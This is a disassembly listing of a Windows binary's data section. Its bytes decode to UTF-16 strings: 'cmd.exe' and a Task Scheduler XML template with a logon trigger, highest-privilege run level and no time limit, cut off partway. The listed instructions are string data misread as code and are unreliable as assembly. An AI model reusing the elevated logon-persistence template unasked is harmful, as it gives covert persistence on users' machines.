  40bfb1:	49                   	dec    %ecx
  40bfb2:	00 3d 00 00 0f 63    	add    %bh,0x630f0000
  40bfb8:	00 6d 00             	add    %ch,0x0(%ebp)
  40bfbb:	64 00 2e             	add    %ch,%fs:(%esi)
  40bfbe:	00 65 00             	add    %ah,0x0(%ebp)
  40bfc1:	78 00                	js     0x40bfc3
  40bfc3:	65 00 00             	add    %al,%gs:(%eax)
  40bfc6:	87 05 0a 00 20 00    	xchg   %eax,0x20000a
  40bfcc:	20 00                	and    %al,(%eax)
  40bfce:	20 00                	and    %al,(%eax)
  40bfd0:	20 00                	and    %al,(%eax)
  40bfd2:	20 00                	and    %al,(%eax)
  40bfd4:	20 00                	and    %al,(%eax)
  40bfd6:	20 00                	and    %al,(%eax)
  40bfd8:	20 00                	and    %al,(%eax)
  40bfda:	20 00                	and    %al,(%eax)
  40bfdc:	20 00                	and    %al,(%eax)
  40bfde:	20 00                	and    %al,(%eax)
  40bfe0:	20 00                	and    %al,(%eax)
  40bfe2:	20 00                	and    %al,(%eax)
  40bfe4:	20 00                	and    %al,(%eax)
  40bfe6:	20 00                	and    %al,(%eax)
  40bfe8:	20 00                	and    %al,(%eax)
  40bfea:	3c 00                	cmp    $0x0,%al
  40bfec:	54                   	push   %esp
  40bfed:	00 61 00             	add    %ah,0x0(%ecx)
  40bff0:	73 00                	jae    0x40bff2
  40bff2:	6b 00 20             	imul   $0x20,(%eax),%eax
  40bff5:	00 78 00             	add    %bh,0x0(%eax)
  40bff8:	6d                   	insl   (%dx),%es:(%edi)
  40bff9:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40bffd:	00 73 00             	add    %dh,0x0(%ebx)
  40c000:	3d 00 27 00 68       	cmp    $0x68002700,%eax
  40c005:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40c009:	00 70 00             	add    %dh,0x0(%eax)
  40c00c:	3a 00                	cmp    (%eax),%al
  40c00e:	2f                   	das
  40c00f:	00 2f                	add    %ch,(%edi)
  40c011:	00 73 00             	add    %dh,0x0(%ebx)
  40c014:	63 00                	arpl   %eax,(%eax)
  40c016:	68 00 65 00 6d       	push   $0x6d006500
  40c01b:	00 61 00             	add    %ah,0x0(%ecx)
  40c01e:	73 00                	jae    0x40c020
  40c020:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  40c024:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  40c02a:	6f                   	outsl  %ds:(%esi),(%dx)
  40c02b:	00 73 00             	add    %dh,0x0(%ebx)
  40c02e:	6f                   	outsl  %ds:(%esi),(%dx)
  40c02f:	00 66 00             	add    %ah,0x0(%esi)
  40c032:	74 00                	je     0x40c034
  40c034:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40c038:	6f                   	outsl  %ds:(%esi),(%dx)
  40c039:	00 6d 00             	add    %ch,0x0(%ebp)
  40c03c:	2f                   	das
  40c03d:	00 77 00             	add    %dh,0x0(%edi)
  40c040:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40c046:	6f                   	outsl  %ds:(%esi),(%dx)
  40c047:	00 77 00             	add    %dh,0x0(%edi)
  40c04a:	73 00                	jae    0x40c04c
  40c04c:	2f                   	das
  40c04d:	00 32                	add    %dh,(%edx)
  40c04f:	00 30                	add    %dh,(%eax)
  40c051:	00 30                	add    %dh,(%eax)
  40c053:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c056:	2f                   	das
  40c057:	00 30                	add    %dh,(%eax)
  40c059:	00 32                	add    %dh,(%edx)
  40c05b:	00 2f                	add    %ch,(%edi)
  40c05d:	00 6d 00             	add    %ch,0x0(%ebp)
  40c060:	69 00 74 00 2f 00    	imul   $0x2f0074,(%eax),%eax
  40c066:	74 00                	je     0x40c068
  40c068:	61                   	popa
  40c069:	00 73 00             	add    %dh,0x0(%ebx)
  40c06c:	6b 00 27             	imul   $0x27,(%eax),%eax
  40c06f:	00 3e                	add    %bh,(%esi)
  40c071:	00 0a                	add    %cl,(%edx)
  40c073:	00 20                	add    %ah,(%eax)
  40c075:	00 20                	add    %ah,(%eax)
  40c077:	00 20                	add    %ah,(%eax)
  40c079:	00 20                	add    %ah,(%eax)
  40c07b:	00 20                	add    %ah,(%eax)
  40c07d:	00 20                	add    %ah,(%eax)
  40c07f:	00 20                	add    %ah,(%eax)
  40c081:	00 20                	add    %ah,(%eax)
  40c083:	00 20                	add    %ah,(%eax)
  40c085:	00 20                	add    %ah,(%eax)
  40c087:	00 20                	add    %ah,(%eax)
  40c089:	00 20                	add    %ah,(%eax)
  40c08b:	00 20                	add    %ah,(%eax)
  40c08d:	00 20                	add    %ah,(%eax)
  40c08f:	00 20                	add    %ah,(%eax)
  40c091:	00 20                	add    %ah,(%eax)
  40c093:	00 20                	add    %ah,(%eax)
  40c095:	00 20                	add    %ah,(%eax)
  40c097:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c09a:	54                   	push   %esp
  40c09b:	00 72 00             	add    %dh,0x0(%edx)
  40c09e:	69 00 67 00 67 00    	imul   $0x670067,(%eax),%eax
  40c0a4:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c0a8:	73 00                	jae    0x40c0aa
  40c0aa:	3e 00 0a             	add    %cl,%ds:(%edx)
  40c0ad:	00 20                	add    %ah,(%eax)
  40c0af:	00 20                	add    %ah,(%eax)
  40c0b1:	00 20                	add    %ah,(%eax)
  40c0b3:	00 20                	add    %ah,(%eax)
  40c0b5:	00 20                	add    %ah,(%eax)
  40c0b7:	00 20                	add    %ah,(%eax)
  40c0b9:	00 20                	add    %ah,(%eax)
  40c0bb:	00 20                	add    %ah,(%eax)
  40c0bd:	00 20                	add    %ah,(%eax)
  40c0bf:	00 20                	add    %ah,(%eax)
  40c0c1:	00 20                	add    %ah,(%eax)
  40c0c3:	00 20                	add    %ah,(%eax)
  40c0c5:	00 20                	add    %ah,(%eax)
  40c0c7:	00 20                	add    %ah,(%eax)
  40c0c9:	00 20                	add    %ah,(%eax)
  40c0cb:	00 20                	add    %ah,(%eax)
  40c0cd:	00 20                	add    %ah,(%eax)
  40c0cf:	00 20                	add    %ah,(%eax)
  40c0d1:	00 20                	add    %ah,(%eax)
  40c0d3:	00 20                	add    %ah,(%eax)
  40c0d5:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c0d8:	4c                   	dec    %esp
  40c0d9:	00 6f 00             	add    %ch,0x0(%edi)
  40c0dc:	67 00 6f 00          	add    %ch,0x0(%bx)
  40c0e0:	6e                   	outsb  %ds:(%esi),(%dx)
  40c0e1:	00 54 00 72          	add    %dl,0x72(%eax,%eax,1)
  40c0e5:	00 69 00             	add    %ch,0x0(%ecx)
  40c0e8:	67 00 67 00          	add    %ah,0x0(%bx)
  40c0ec:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c0f0:	3e 00 0a             	add    %cl,%ds:(%edx)
  40c0f3:	00 20                	add    %ah,(%eax)
  40c0f5:	00 20                	add    %ah,(%eax)
  40c0f7:	00 20                	add    %ah,(%eax)
  40c0f9:	00 20                	add    %ah,(%eax)
  40c0fb:	00 20                	add    %ah,(%eax)
  40c0fd:	00 20                	add    %ah,(%eax)
  40c0ff:	00 20                	add    %ah,(%eax)
  40c101:	00 20                	add    %ah,(%eax)
  40c103:	00 20                	add    %ah,(%eax)
  40c105:	00 20                	add    %ah,(%eax)
  40c107:	00 20                	add    %ah,(%eax)
  40c109:	00 20                	add    %ah,(%eax)
  40c10b:	00 20                	add    %ah,(%eax)
  40c10d:	00 20                	add    %ah,(%eax)
  40c10f:	00 20                	add    %ah,(%eax)
  40c111:	00 20                	add    %ah,(%eax)
  40c113:	00 20                	add    %ah,(%eax)
  40c115:	00 20                	add    %ah,(%eax)
  40c117:	00 20                	add    %ah,(%eax)
  40c119:	00 20                	add    %ah,(%eax)
  40c11b:	00 20                	add    %ah,(%eax)
  40c11d:	00 20                	add    %ah,(%eax)
  40c11f:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c122:	45                   	inc    %ebp
  40c123:	00 6e 00             	add    %ch,0x0(%esi)
  40c126:	61                   	popa
  40c127:	00 62 00             	add    %ah,0x0(%edx)
  40c12a:	6c                   	insb   (%dx),%es:(%edi)
  40c12b:	00 65 00             	add    %ah,0x0(%ebp)
  40c12e:	64 00 3e             	add    %bh,%fs:(%esi)
  40c131:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40c135:	00 75 00             	add    %dh,0x0(%ebp)
  40c138:	65 00 3c 00          	add    %bh,%gs:(%eax,%eax,1)
  40c13c:	2f                   	das
  40c13d:	00 45 00             	add    %al,0x0(%ebp)
  40c140:	6e                   	outsb  %ds:(%esi),(%dx)
  40c141:	00 61 00             	add    %ah,0x0(%ecx)
  40c144:	62 00                	bound  %eax,(%eax)
  40c146:	6c                   	insb   (%dx),%es:(%edi)
  40c147:	00 65 00             	add    %ah,0x0(%ebp)
  40c14a:	64 00 3e             	add    %bh,%fs:(%esi)
  40c14d:	00 0a                	add    %cl,(%edx)
  40c14f:	00 20                	add    %ah,(%eax)
  40c151:	00 20                	add    %ah,(%eax)
  40c153:	00 20                	add    %ah,(%eax)
  40c155:	00 20                	add    %ah,(%eax)
  40c157:	00 20                	add    %ah,(%eax)
  40c159:	00 20                	add    %ah,(%eax)
  40c15b:	00 20                	add    %ah,(%eax)
  40c15d:	00 20                	add    %ah,(%eax)
  40c15f:	00 20                	add    %ah,(%eax)
  40c161:	00 20                	add    %ah,(%eax)
  40c163:	00 20                	add    %ah,(%eax)
  40c165:	00 20                	add    %ah,(%eax)
  40c167:	00 20                	add    %ah,(%eax)
  40c169:	00 20                	add    %ah,(%eax)
  40c16b:	00 20                	add    %ah,(%eax)
  40c16d:	00 20                	add    %ah,(%eax)
  40c16f:	00 20                	add    %ah,(%eax)
  40c171:	00 20                	add    %ah,(%eax)
  40c173:	00 20                	add    %ah,(%eax)
  40c175:	00 20                	add    %ah,(%eax)
  40c177:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c17a:	2f                   	das
  40c17b:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40c17f:	00 67 00             	add    %ah,0x0(%edi)
  40c182:	6f                   	outsl  %ds:(%esi),(%dx)
  40c183:	00 6e 00             	add    %ch,0x0(%esi)
  40c186:	54                   	push   %esp
  40c187:	00 72 00             	add    %dh,0x0(%edx)
  40c18a:	69 00 67 00 67 00    	imul   $0x670067,(%eax),%eax
  40c190:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c194:	3e 00 0a             	add    %cl,%ds:(%edx)
  40c197:	00 20                	add    %ah,(%eax)
  40c199:	00 20                	add    %ah,(%eax)
  40c19b:	00 20                	add    %ah,(%eax)
  40c19d:	00 20                	add    %ah,(%eax)
  40c19f:	00 20                	add    %ah,(%eax)
  40c1a1:	00 20                	add    %ah,(%eax)
  40c1a3:	00 20                	add    %ah,(%eax)
  40c1a5:	00 20                	add    %ah,(%eax)
  40c1a7:	00 20                	add    %ah,(%eax)
  40c1a9:	00 20                	add    %ah,(%eax)
  40c1ab:	00 20                	add    %ah,(%eax)
  40c1ad:	00 20                	add    %ah,(%eax)
  40c1af:	00 20                	add    %ah,(%eax)
  40c1b1:	00 20                	add    %ah,(%eax)
  40c1b3:	00 20                	add    %ah,(%eax)
  40c1b5:	00 20                	add    %ah,(%eax)
  40c1b7:	00 20                	add    %ah,(%eax)
  40c1b9:	00 20                	add    %ah,(%eax)
  40c1bb:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c1be:	2f                   	das
  40c1bf:	00 54 00 72          	add    %dl,0x72(%eax,%eax,1)
  40c1c3:	00 69 00             	add    %ch,0x0(%ecx)
  40c1c6:	67 00 67 00          	add    %ah,0x0(%bx)
  40c1ca:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c1ce:	73 00                	jae    0x40c1d0
  40c1d0:	3e 00 0a             	add    %cl,%ds:(%edx)
  40c1d3:	00 20                	add    %ah,(%eax)
  40c1d5:	00 20                	add    %ah,(%eax)
  40c1d7:	00 20                	add    %ah,(%eax)
  40c1d9:	00 20                	add    %ah,(%eax)
  40c1db:	00 20                	add    %ah,(%eax)
  40c1dd:	00 20                	add    %ah,(%eax)
  40c1df:	00 20                	add    %ah,(%eax)
  40c1e1:	00 20                	add    %ah,(%eax)
  40c1e3:	00 20                	add    %ah,(%eax)
  40c1e5:	00 20                	add    %ah,(%eax)
  40c1e7:	00 20                	add    %ah,(%eax)
  40c1e9:	00 20                	add    %ah,(%eax)
  40c1eb:	00 20                	add    %ah,(%eax)
  40c1ed:	00 20                	add    %ah,(%eax)
  40c1ef:	00 20                	add    %ah,(%eax)
  40c1f1:	00 20                	add    %ah,(%eax)
  40c1f3:	00 20                	add    %ah,(%eax)
  40c1f5:	00 20                	add    %ah,(%eax)
  40c1f7:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c1fa:	50                   	push   %eax
  40c1fb:	00 72 00             	add    %dh,0x0(%edx)
  40c1fe:	69 00 6e 00 63 00    	imul   $0x63006e,(%eax),%eax
  40c204:	69 00 70 00 61 00    	imul   $0x610070,(%eax),%eax
  40c20a:	6c                   	insb   (%dx),%es:(%edi)
  40c20b:	00 73 00             	add    %dh,0x0(%ebx)
  40c20e:	3e 00 0a             	add    %cl,%ds:(%edx)
  40c211:	00 20                	add    %ah,(%eax)
  40c213:	00 20                	add    %ah,(%eax)
  40c215:	00 20                	add    %ah,(%eax)
  40c217:	00 20                	add    %ah,(%eax)
  40c219:	00 20                	add    %ah,(%eax)
  40c21b:	00 20                	add    %ah,(%eax)
  40c21d:	00 20                	add    %ah,(%eax)
  40c21f:	00 20                	add    %ah,(%eax)
  40c221:	00 20                	add    %ah,(%eax)
  40c223:	00 20                	add    %ah,(%eax)
  40c225:	00 20                	add    %ah,(%eax)
  40c227:	00 20                	add    %ah,(%eax)
  40c229:	00 20                	add    %ah,(%eax)
  40c22b:	00 20                	add    %ah,(%eax)
  40c22d:	00 20                	add    %ah,(%eax)
  40c22f:	00 20                	add    %ah,(%eax)
  40c231:	00 20                	add    %ah,(%eax)
  40c233:	00 20                	add    %ah,(%eax)
  40c235:	00 20                	add    %ah,(%eax)
  40c237:	00 20                	add    %ah,(%eax)
  40c239:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c23c:	50                   	push   %eax
  40c23d:	00 72 00             	add    %dh,0x0(%edx)
  40c240:	69 00 6e 00 63 00    	imul   $0x63006e,(%eax),%eax
  40c246:	69 00 70 00 61 00    	imul   $0x610070,(%eax),%eax
  40c24c:	6c                   	insb   (%dx),%es:(%edi)
  40c24d:	00 20                	add    %ah,(%eax)
  40c24f:	00 69 00             	add    %ch,0x0(%ecx)
  40c252:	64 00 3d 00 27 00 41 	add    %bh,%fs:0x41002700
  40c259:	00 75 00             	add    %dh,0x0(%ebp)
  40c25c:	74 00                	je     0x40c25e
  40c25e:	68 00 6f 00 72       	push   $0x72006f00
  40c263:	00 27                	add    %ah,(%edi)
  40c265:	00 3e                	add    %bh,(%esi)
  40c267:	00 0a                	add    %cl,(%edx)
  40c269:	00 20                	add    %ah,(%eax)
  40c26b:	00 20                	add    %ah,(%eax)
  40c26d:	00 20                	add    %ah,(%eax)
  40c26f:	00 20                	add    %ah,(%eax)
  40c271:	00 20                	add    %ah,(%eax)
  40c273:	00 20                	add    %ah,(%eax)
  40c275:	00 20                	add    %ah,(%eax)
  40c277:	00 20                	add    %ah,(%eax)
  40c279:	00 20                	add    %ah,(%eax)
  40c27b:	00 20                	add    %ah,(%eax)
  40c27d:	00 20                	add    %ah,(%eax)
  40c27f:	00 20                	add    %ah,(%eax)
  40c281:	00 20                	add    %ah,(%eax)
  40c283:	00 20                	add    %ah,(%eax)
  40c285:	00 20                	add    %ah,(%eax)
  40c287:	00 20                	add    %ah,(%eax)
  40c289:	00 20                	add    %ah,(%eax)
  40c28b:	00 20                	add    %ah,(%eax)
  40c28d:	00 20                	add    %ah,(%eax)
  40c28f:	00 20                	add    %ah,(%eax)
  40c291:	00 20                	add    %ah,(%eax)
  40c293:	00 20                	add    %ah,(%eax)
  40c295:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c298:	4c                   	dec    %esp
  40c299:	00 6f 00             	add    %ch,0x0(%edi)
  40c29c:	67 00 6f 00          	add    %ch,0x0(%bx)
  40c2a0:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2a1:	00 54 00 79          	add    %dl,0x79(%eax,%eax,1)
  40c2a5:	00 70 00             	add    %dh,0x0(%eax)
  40c2a8:	65 00 3e             	add    %bh,%gs:(%esi)
  40c2ab:	00 49 00             	add    %cl,0x0(%ecx)
  40c2ae:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2af:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c2b3:	00 72 00             	add    %dh,0x0(%edx)
  40c2b6:	61                   	popa
  40c2b7:	00 63 00             	add    %ah,0x0(%ebx)
  40c2ba:	74 00                	je     0x40c2bc
  40c2bc:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  40c2c2:	54                   	push   %esp
  40c2c3:	00 6f 00             	add    %ch,0x0(%edi)
  40c2c6:	6b 00 65             	imul   $0x65,(%eax),%eax
  40c2c9:	00 6e 00             	add    %ch,0x0(%esi)
  40c2cc:	3c 00                	cmp    $0x0,%al
  40c2ce:	2f                   	das
  40c2cf:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40c2d3:	00 67 00             	add    %ah,0x0(%edi)
  40c2d6:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2d7:	00 6e 00             	add    %ch,0x0(%esi)
  40c2da:	54                   	push   %esp
  40c2db:	00 79 00             	add    %bh,0x0(%ecx)
  40c2de:	70 00                	jo     0x40c2e0
  40c2e0:	65 00 3e             	add    %bh,%gs:(%esi)
  40c2e3:	00 0a                	add    %cl,(%edx)
  40c2e5:	00 20                	add    %ah,(%eax)
  40c2e7:	00 20                	add    %ah,(%eax)
  40c2e9:	00 20                	add    %ah,(%eax)
  40c2eb:	00 20                	add    %ah,(%eax)
  40c2ed:	00 20                	add    %ah,(%eax)
  40c2ef:	00 20                	add    %ah,(%eax)
  40c2f1:	00 20                	add    %ah,(%eax)
  40c2f3:	00 20                	add    %ah,(%eax)
  40c2f5:	00 20                	add    %ah,(%eax)
  40c2f7:	00 20                	add    %ah,(%eax)
  40c2f9:	00 20                	add    %ah,(%eax)
  40c2fb:	00 20                	add    %ah,(%eax)
  40c2fd:	00 20                	add    %ah,(%eax)
  40c2ff:	00 20                	add    %ah,(%eax)
  40c301:	00 20                	add    %ah,(%eax)
  40c303:	00 20                	add    %ah,(%eax)
  40c305:	00 20                	add    %ah,(%eax)
  40c307:	00 20                	add    %ah,(%eax)
  40c309:	00 20                	add    %ah,(%eax)
  40c30b:	00 20                	add    %ah,(%eax)
  40c30d:	00 20                	add    %ah,(%eax)
  40c30f:	00 20                	add    %ah,(%eax)
  40c311:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c314:	52                   	push   %edx
  40c315:	00 75 00             	add    %dh,0x0(%ebp)
  40c318:	6e                   	outsb  %ds:(%esi),(%dx)
  40c319:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  40c31d:	00 76 00             	add    %dh,0x0(%esi)
  40c320:	65 00 6c 00 3e       	add    %ch,%gs:0x3e(%eax,%eax,1)
  40c325:	00 48 00             	add    %cl,0x0(%eax)
  40c328:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40c32e:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c332:	74 00                	je     0x40c334
  40c334:	41                   	inc    %ecx
  40c335:	00 76 00             	add    %dh,0x0(%esi)
  40c338:	61                   	popa
  40c339:	00 69 00             	add    %ch,0x0(%ecx)
  40c33c:	6c                   	insb   (%dx),%es:(%edi)
  40c33d:	00 61 00             	add    %ah,0x0(%ecx)
  40c340:	62 00                	bound  %eax,(%eax)
  40c342:	6c                   	insb   (%dx),%es:(%edi)
  40c343:	00 65 00             	add    %ah,0x0(%ebp)
  40c346:	3c 00                	cmp    $0x0,%al
  40c348:	2f                   	das
  40c349:	00 52 00             	add    %dl,0x0(%edx)
  40c34c:	75 00                	jne    0x40c34e
  40c34e:	6e                   	outsb  %ds:(%esi),(%dx)
  40c34f:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  40c353:	00 76 00             	add    %dh,0x0(%esi)
  40c356:	65 00 6c 00 3e       	add    %ch,%gs:0x3e(%eax,%eax,1)
  40c35b:	00 0a                	add    %cl,(%edx)
  40c35d:	00 20                	add    %ah,(%eax)
  40c35f:	00 20                	add    %ah,(%eax)
  40c361:	00 20                	add    %ah,(%eax)
  40c363:	00 20                	add    %ah,(%eax)
  40c365:	00 20                	add    %ah,(%eax)
  40c367:	00 20                	add    %ah,(%eax)
  40c369:	00 20                	add    %ah,(%eax)
  40c36b:	00 20                	add    %ah,(%eax)
  40c36d:	00 20                	add    %ah,(%eax)
  40c36f:	00 20                	add    %ah,(%eax)
  40c371:	00 20                	add    %ah,(%eax)
  40c373:	00 20                	add    %ah,(%eax)
  40c375:	00 20                	add    %ah,(%eax)
  40c377:	00 20                	add    %ah,(%eax)
  40c379:	00 20                	add    %ah,(%eax)
  40c37b:	00 20                	add    %ah,(%eax)
  40c37d:	00 20                	add    %ah,(%eax)
  40c37f:	00 20                	add    %ah,(%eax)
  40c381:	00 20                	add    %ah,(%eax)
  40c383:	00 20                	add    %ah,(%eax)
  40c385:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c388:	2f                   	das
  40c389:	00 50 00             	add    %dl,0x0(%eax)
  40c38c:	72 00                	jb     0x40c38e
  40c38e:	69 00 6e 00 63 00    	imul   $0x63006e,(%eax),%eax
  40c394:	69 00 70 00 61 00    	imul   $0x610070,(%eax),%eax
  40c39a:	6c                   	insb   (%dx),%es:(%edi)
  40c39b:	00 3e                	add    %bh,(%esi)
  40c39d:	00 0a                	add    %cl,(%edx)
  40c39f:	00 20                	add    %ah,(%eax)
  40c3a1:	00 20                	add    %ah,(%eax)
  40c3a3:	00 20                	add    %ah,(%eax)
  40c3a5:	00 20                	add    %ah,(%eax)
  40c3a7:	00 20                	add    %ah,(%eax)
  40c3a9:	00 20                	add    %ah,(%eax)
  40c3ab:	00 20                	add    %ah,(%eax)
  40c3ad:	00 20                	add    %ah,(%eax)
  40c3af:	00 20                	add    %ah,(%eax)
  40c3b1:	00 20                	add    %ah,(%eax)
  40c3b3:	00 20                	add    %ah,(%eax)
  40c3b5:	00 20                	add    %ah,(%eax)
  40c3b7:	00 20                	add    %ah,(%eax)
  40c3b9:	00 20                	add    %ah,(%eax)
  40c3bb:	00 20                	add    %ah,(%eax)
  40c3bd:	00 20                	add    %ah,(%eax)
  40c3bf:	00 20                	add    %ah,(%eax)
  40c3c1:	00 20                	add    %ah,(%eax)
  40c3c3:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c3c6:	2f                   	das
  40c3c7:	00 50 00             	add    %dl,0x0(%eax)
  40c3ca:	72 00                	jb     0x40c3cc
  40c3cc:	69 00 6e 00 63 00    	imul   $0x63006e,(%eax),%eax
  40c3d2:	69 00 70 00 61 00    	imul   $0x610070,(%eax),%eax
  40c3d8:	6c                   	insb   (%dx),%es:(%edi)
  40c3d9:	00 73 00             	add    %dh,0x0(%ebx)
  40c3dc:	3e 00 0a             	add    %cl,%ds:(%edx)
  40c3df:	00 20                	add    %ah,(%eax)
  40c3e1:	00 20                	add    %ah,(%eax)
  40c3e3:	00 20                	add    %ah,(%eax)
  40c3e5:	00 20                	add    %ah,(%eax)
  40c3e7:	00 20                	add    %ah,(%eax)
  40c3e9:	00 20                	add    %ah,(%eax)
  40c3eb:	00 20                	add    %ah,(%eax)
  40c3ed:	00 20                	add    %ah,(%eax)
  40c3ef:	00 20                	add    %ah,(%eax)
  40c3f1:	00 20                	add    %ah,(%eax)
  40c3f3:	00 20                	add    %ah,(%eax)
  40c3f5:	00 20                	add    %ah,(%eax)
  40c3f7:	00 20                	add    %ah,(%eax)
  40c3f9:	00 20                	add    %ah,(%eax)
  40c3fb:	00 20                	add    %ah,(%eax)
  40c3fd:	00 20                	add    %ah,(%eax)
  40c3ff:	00 20                	add    %ah,(%eax)
  40c401:	00 20                	add    %ah,(%eax)
  40c403:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c406:	53                   	push   %ebx
  40c407:	00 65 00             	add    %ah,0x0(%ebp)
  40c40a:	74 00                	je     0x40c40c
  40c40c:	74 00                	je     0x40c40e
  40c40e:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40c414:	73 00                	jae    0x40c416
  40c416:	3e 00 0a             	add    %cl,%ds:(%edx)
  40c419:	00 20                	add    %ah,(%eax)
  40c41b:	00 20                	add    %ah,(%eax)
  40c41d:	00 20                	add    %ah,(%eax)
  40c41f:	00 20                	add    %ah,(%eax)
  40c421:	00 20                	add    %ah,(%eax)
  40c423:	00 20                	add    %ah,(%eax)
  40c425:	00 20                	add    %ah,(%eax)
  40c427:	00 20                	add    %ah,(%eax)
  40c429:	00 20                	add    %ah,(%eax)
  40c42b:	00 20                	add    %ah,(%eax)
  40c42d:	00 20                	add    %ah,(%eax)
  40c42f:	00 20                	add    %ah,(%eax)
  40c431:	00 20                	add    %ah,(%eax)
  40c433:	00 20                	add    %ah,(%eax)
  40c435:	00 20                	add    %ah,(%eax)
  40c437:	00 20                	add    %ah,(%eax)
  40c439:	00 20                	add    %ah,(%eax)
  40c43b:	00 20                	add    %ah,(%eax)
  40c43d:	00 20                	add    %ah,(%eax)
  40c43f:	00 20                	add    %ah,(%eax)
  40c441:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c444:	45                   	inc    %ebp
  40c445:	00 78 00             	add    %bh,0x0(%eax)
  40c448:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c44c:	75 00                	jne    0x40c44e
  40c44e:	74 00                	je     0x40c450
  40c450:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c456:	54                   	push   %esp
  40c457:	00 69 00             	add    %ch,0x0(%ecx)
  40c45a:	6d                   	insl   (%dx),%es:(%edi)
  40c45b:	00 65 00             	add    %ah,0x0(%ebp)
  40c45e:	4c                   	dec    %esp
  40c45f:	00 69 00             	add    %ch,0x0(%ecx)
  40c462:	6d                   	insl   (%dx),%es:(%edi)
  40c463:	00 69 00             	add    %ch,0x0(%ecx)
  40c466:	74 00                	je     0x40c468
  40c468:	3e 00 50 00          	add    %dl,%ds:0x0(%eax)
  40c46c:	54                   	push   %esp
  40c46d:	00 30                	add    %dh,(%eax)
  40c46f:	00 53 00             	add    %dl,0x0(%ebx)
  40c472:	3c 00                	cmp    $0x0,%al
  40c474:	2f                   	das
  40c475:	00 45 00             	add    %al,0x0(%ebp)
  40c478:	78 00                	js     0x40c47a
  40c47a:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c47e:	75 00                	jne    0x40c480
  40c480:	74 00                	je     0x40c482
  40c482:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c488:	54                   	push   %esp
  40c489:	00 69 00             	add    %ch,0x0(%ecx)
  40c48c:	6d                   	insl   (%dx),%es:(%edi)
  40c48d:	00 65 00             	add    %ah,0x0(%ebp)
  40c490:	4c                   	dec    %esp
  40c491:	00 69 00             	add    %ch,0x0(%ecx)
  40c494:	6d                   	insl   (%dx),%es:(%edi)
  40c495:	00 69 00             	add    %ch,0x0(%ecx)
  40c498:	74 00                	je     0x40c49a
  40c49a:	3e 00 0a             	add    %cl,%ds:(%edx)
  40c49d:	00 20                	add    %ah,(%eax)
  40c49f:	00 20                	add    %ah,(%eax)
  40c4a1:	00 20                	add    %ah,(%eax)
  40c4a3:	00 20                	add    %ah,(%eax)
  40c4a5:	00 20                	add    %ah,(%eax)
  40c4a7:	00 20                	add    %ah,(%eax)
  40c4a9:	00 20                	add    %ah,(%eax)
  40c4ab:	00 20                	add    %ah,(%eax)
  40c4ad:	00 20                	add    %ah,(%eax)
  40c4af:	00 20                	add    %ah,(%eax)
  40c4b1:	00 20                	add    %ah,(%eax)
  40c4b3:	00 20                	add    %ah,(%eax)
  40c4b5:	00 20                	add    %ah,(%eax)
  40c4b7:	00 20                	add    %ah,(%eax)
  40c4b9:	00 20                	add    %ah,(%eax)
  40c4bb:	00 20                	add    %ah,(%eax)
  40c4bd:	00 20                	add    %ah,(%eax)
  40c4bf:	00 20                	add    %ah,(%eax)
  40c4c1:	00 20                	add    %ah,(%eax)
  40c4c3:	00 20                	add    %ah,(%eax)
  40c4c5:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40c4c8:	44                   	inc    %esp
  40c4c9:	00 69 00             	add    %ch,0x0(%ecx)
  40c4cc:	73 00                	jae    0x40c4ce
  40c4ce:	61                   	popa
  40c4cf:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c4d3:	00 6f 00             	add    %ch,0x0(%edi)
  40c4d6:	77 00                	ja     0x40c4d8
  40c4d8:	53                   	push   %ebx
  40c4d9:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40c4dd:	00 72 00             	add    %dh,0x0(%edx)
  40c4e0:	74 00                	je     0x40c4e2
  40c4e2:	49                   	dec    %ecx
  40c4e3:	00 66 00             	add    %ah,0x0(%esi)
  40c4e6:	4f                   	dec    %edi
  40c4e7:	00 6e 00             	add    %ch,0x0(%esi)
  40c4ea:	42                   	inc    %edx
  40c4eb:	00 61 00             	add    %ah,0x0(%ecx)
  40c4ee:	74 00                	je     0x40c4f0
  40c4f0:	74 00                	je     0x40c4f2
